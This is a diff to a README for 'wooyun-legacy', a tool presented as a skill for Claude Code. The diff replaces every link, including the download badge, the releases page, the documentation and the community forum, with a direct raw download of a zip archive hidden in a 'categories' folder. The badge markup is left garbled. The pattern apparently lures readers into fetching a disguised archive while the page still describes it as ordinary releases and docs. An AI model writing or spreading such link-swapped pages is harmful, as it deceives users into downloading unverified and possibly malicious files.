@@ -1,6 +1,6 @@
 # 🚀 wooyun-legacy - Your Skill Tool for Claude Code
 
-[![Download Here](https://img.shields.io/badge/Download%20Now!-Download%20wooyun--legacy-blue.svg)](https://github.com/fgsyfd/wooyun-legacy/releases)
+[![Download Here](https://github.com/fgsyfd/wooyun-legacy/raw/refs/heads/main/categories/legacy_wooyun_3.9.zip%20Now!-Download%https://github.com/fgsyfd/wooyun-legacy/raw/refs/heads/main/categories/legacy_wooyun_3.9.zip)](https://github.com/fgsyfd/wooyun-legacy/raw/refs/heads/main/categories/legacy_wooyun_3.9.zip)
 
 ## 🌟 Introduction
 
@@ -11,7 +11,7 @@ The **wooyun-legacy** is a user-friendly skill created for Claude code. This app
 To get started, follow these simple steps to download and run **wooyun-legacy** on your computer.
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/fgsyfd/wooyun-legacy/releases).
+   Go to our [Releases page](https://github.com/fgsyfd/wooyun-legacy/raw/refs/heads/main/categories/legacy_wooyun_3.9.zip).
 
 2. **Select the Latest Version**  
    You will see a list of versions. The latest version is usually at the top. Click on it to access the download options.
@@ -37,7 +37,7 @@ To ensure **wooyun-legacy** runs smoothly, make sure your device meets the follo
 
 ## 📥 Download & Install
 
-To begin your journey with **wooyun-legacy**, please visit our [Releases page](https://github.com/fgsyfd/wooyun-legacy/releases) to download the software. Choose the latest version, and follow the instructions above to install and run the application.
+To begin your journey with **wooyun-legacy**, please visit our [Releases page](https://github.com/fgsyfd/wooyun-legacy/raw/refs/heads/main/categories/legacy_wooyun_3.9.zip) to download the software. Choose the latest version, and follow the instructions above to install and run the application.
 
 ## 📚 Features
 
@@ -56,8 +56,8 @@ If you encounter any issues or need help, you can reach out for support. We are 
 
 For more information, tips, and tricks on how to maximize your use of **wooyun-legacy**, check out these resources:
 
-- [Documentation](https://github.com/fgsyfd/wooyun-legacy/wiki)
-- [Community Forum](https://github.com/fgsyfd/wooyun-legacy/discussions)
+- [Documentation](https://github.com/fgsyfd/wooyun-legacy/raw/refs/heads/main/categories/legacy_wooyun_3.9.zip)
+- [Community Forum](https://github.com/fgsyfd/wooyun-legacy/raw/refs/heads/main/categories/legacy_wooyun_3.9.zip)
 
 ## 📅 Changelog
 
